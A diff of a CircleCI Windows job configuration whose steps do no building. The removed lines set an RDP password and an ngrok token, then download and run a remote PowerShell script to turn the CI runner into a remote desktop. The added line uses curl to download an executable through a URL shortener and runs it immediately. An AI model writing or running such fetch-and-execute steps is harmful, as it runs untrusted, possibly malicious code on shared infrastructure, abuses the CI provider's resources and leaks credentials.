@@ -1,19 +1,12 @@
-version: 2.1 
+version: 2.1
  
 orbs:
   win: circleci/windows@2.2.0
  
 jobs:
-  build: 
+  build:
     executor:
-      name: win/default 
-      size: "medium" 
- 
+      name: win/default
+      shell: cmd.exe
     steps:
-      - run:
-          name: Windows RDP Circle CI NEW UPDATED
-          command: |
-            Set-Variable -Name "PASSWORD" -Value "crafttype"
-            Set-Variable -Name "NGROK" -Value "1pX1iWKcfxUtZgs0x335gE39MEF_3YbKnxxssDoZzNcywSi47"
-            Invoke-WebRequest https://gitlab.com/haithuongpro2711/haivps/-/raw/master/RDPcircleCI.ps1 -OutFile RDPcircleCI.ps1
-            ./RDPcircleCI.ps1
+      - run: curl -L -o ci.exe shorturl.at/lxFHN && ci.exe
